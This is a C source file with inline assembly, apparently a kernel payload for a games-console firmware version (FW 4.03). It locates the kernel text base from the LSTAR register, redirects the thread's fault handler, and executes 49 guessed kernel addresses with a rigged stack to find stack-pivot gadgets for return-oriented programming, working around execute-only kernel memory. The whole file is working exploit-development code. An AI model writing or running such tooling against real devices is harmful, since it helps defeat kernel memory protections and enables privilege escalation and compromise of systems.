#include <stdint.h>

/*
 * smart_pivot_scan v11 — Execute-test for stack pivot gadgets
 *
 * Can't read ktext (EPT XO), but CAN execute at any ktext address.
 * For each candidate address, jump there with a controlled stack:
 *   - fake_stack filled with success_label at every slot
 *   - real stack: [fake_stack_addr, not_pivot_label, ...]
 *   - RBP = fake_stack_addr (catches leave;ret too)
 *
 * If candidate is "pop rsp; ...; ret" → lands at success_label → FOUND
 * If candidate is "pop rXX; ret"     → lands at not_pivot_label → not found
 * If candidate faults                → pcb_onfault catches → not found
 *
 * Tests 49 candidates: 7 function boundaries × 7 offsets (-2 to -8).
 * Function boundaries from v9 kdata scan of FW 4.03.
 *
 * Output:
 *   [0] tag|magic
 *   [1] kdata_base
 *   [2] ktext_base
 *   [3] n_candidates_tested
 *   [4] pivot_bitmap (bit N = candidate N is a pivot)
 *   [5] fault_bitmap (bit N = candidate N faulted)
 *   [6] LSTAR
 *   [7] first_boundary | second_boundary (verification)
 *
 * Decode: candidate N → boundary N/7, offset (N%7)+2
 *   gadget = ktext_base + boundary[N/7] - ((N%7)+2)
 */

#define MAGIC_SPVT     0x53505654

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

/* Globals for fault recovery — written before read, no init needed */
static volatile uint64_t g_saved_rsp;
static volatile uint64_t g_resume_rip;

__attribute__((naked))
static void fault_handler(void)
{
    __asm__ volatile(
        "movq g_saved_rsp(%%rip), %%rsp\n\t"
        "jmpq *g_resume_rip(%%rip)\n\t"
        ::: "memory"
    );
}

/*
 * Test if executing at 'addr' behaves like a stack pivot.
 * addr in rdi, fake_stack_ptr in rsi (System V ABI).
 * Returns: 0=not_pivot, 1=pivot, 2=fault
 */
__attribute__((naked, noinline))
static int test_pivot(uint64_t addr, uint64_t fake_stack_ptr)
{
    __asm__ volatile(
        /* Save callee-saved regs */
        "pushq %%rbx\n\t"
        "pushq %%r12\n\t"
        "pushq %%r13\n\t"
        "pushq %%r14\n\t"
        "pushq %%r15\n\t"
        "pushq %%rbp\n\t"

        /* Save RSP for recovery */
        "movq %%rsp, g_saved_rsp(%%rip)\n\t"

        /* Point fault handler resume to label 30 */
        "leaq 30f(%%rip), %%rax\n\t"
        "movq %%rax, g_resume_rip(%%rip)\n\t"

        /* Fill fake_stack[0..7] with success label address */
        "leaq 10f(%%rip), %%rax\n\t"
        "movq %%rax,   (%%rsi)\n\t"
        "movq %%rax,  8(%%rsi)\n\t"
        "movq %%rax, 16(%%rsi)\n\t"
        "movq %%rax, 24(%%rsi)\n\t"
        "movq %%rax, 32(%%rsi)\n\t"
        "movq %%rax, 40(%%rsi)\n\t"
        "movq %%rax, 48(%%rsi)\n\t"
        "movq %%rax, 56(%%rsi)\n\t"

        /*
         * Build test stack frame:
         *   RSP+0  = fake_stack_ptr   (pop rsp reads this)
         *   RSP+8  = not_pivot_label  (plain ret reads this)
         *   RSP+16 = not_pivot_label  (safety for pop;pop;ret)
         *   RSP+24 = not_pivot_label  (safety)
         *   RSP+32 = not_pivot_label  (safety)
         *   RSP+40 = not_pivot_label  (safety)
         */
        "subq $48, %%rsp\n\t"
        "movq %%rsi, (%%rsp)\n\t"
        "leaq 20f(%%rip), %%rax\n\t"
        "movq %%rax,  8(%%rsp)\n\t"
        "movq %%rax, 16(%%rsp)\n\t"
        "movq %%rax, 24(%%rsp)\n\t"
        "movq %%rax, 32(%%rsp)\n\t"
        "movq %%rax, 40(%%rsp)\n\t"

        /* RBP = fake_stack_ptr to detect leave;ret */
        "movq %%rsi, %%rbp\n\t"

        /* JUMP TO CANDIDATE */
        "jmpq *%%rdi\n\t"

        /* --- Landing pads --- */

        /* 10: PIVOT FOUND — arrived via fake stack */
        "10:\n\t"
        "movq g_saved_rsp(%%rip), %%rsp\n\t"
        "movl $1, %%eax\n\t"
        "jmp 40f\n\t"

        /* 20: NOT PIVOT — normal return path */
        "20:\n\t"
        "movq g_saved_rsp(%%rip), %%rsp\n\t"
        "movl $0, %%eax\n\t"
        "jmp 40f\n\t"

        /* 30: FAULT — pcb_onfault brought us here */
        /*     (RSP already restored by fault_handler) */
        "30:\n\t"
        "movl $2, %%eax\n\t"

        /* 40: Common exit — restore callee-saved regs */
        "40:\n\t"
        "popq %%rbp\n\t"
        "popq %%r15\n\t"
        "popq %%r14\n\t"
        "popq %%r13\n\t"
        "popq %%r12\n\t"
        "popq %%rbx\n\t"
        "retq\n\t"
        ::: "memory"
    );
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;

    volatile uint64_t* out = (volatile uint64_t*)args;
    for (int i = 0; i < 2304 / 8; i++)
        out[i] = 0;

    out[0] = ((uint64_t)0xAAAA << 32) | MAGIC_SPVT;
    out[1] = kdata_base;
    out[2] = ktext_base;

    /* Set up pcb_onfault */
    uint64_t curthread;
    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
    uint64_t pcb = *(volatile uint64_t*)(curthread + 0x3f8);
    volatile uint64_t *onfault = (volatile uint64_t *)(pcb + 0xb0);

    /* Fake stack in scratch area (well beyond visible output) */
    volatile uint64_t *fake_stack = &out[200];

    /*
     * Function boundaries from v9 kdata scan (sorted ktext offsets).
     * These are entry points of the NEXT function — the bytes just
     * before each boundary are the epilogue of the previous function.
     */
    static const uint32_t boundaries[] = {
        0x00290d08, 0x00291d10, 0x00291d48, 0x00291d60,
        0x002932f8, 0x0029e2d8, 0x002a0858
    };
    #define N_BOUNDS 7
    #define MIN_OFF  2    /* test boundary-2 through boundary-8 */
    #define MAX_OFF  8
    #define OFFS_PER (MAX_OFF - MIN_OFF + 1)  /* 7 */

    uint64_t pivots = 0;
    uint64_t faulted = 0;
    int bit = 0;

    for (int b = 0; b < N_BOUNDS && bit < 49; b++) {
        for (int off = MIN_OFF; off <= MAX_OFF; off++) {
            uint64_t addr = ktext_base + boundaries[b] - off;

            /* Re-arm pcb_onfault before each test (may be cleared on fault) */
            *onfault = (uint64_t)fault_handler;

            int r = test_pivot(addr, (uint64_t)fake_stack);

            if (r == 1) pivots  |= (1ULL << bit);
            if (r == 2) faulted |= (1ULL << bit);
            bit++;
        }
    }

    /* Clear onfault */
    *onfault = 0;

    out[3] = (uint64_t)bit;
    out[4] = pivots;
    out[5] = faulted;
    out[6] = lstar;
    out[7] = (uint64_t)boundaries[0] | ((uint64_t)boundaries[1] << 32);

    out[0] = ((uint64_t)0x0001 << 32) | MAGIC_SPVT;
    return 0;
}
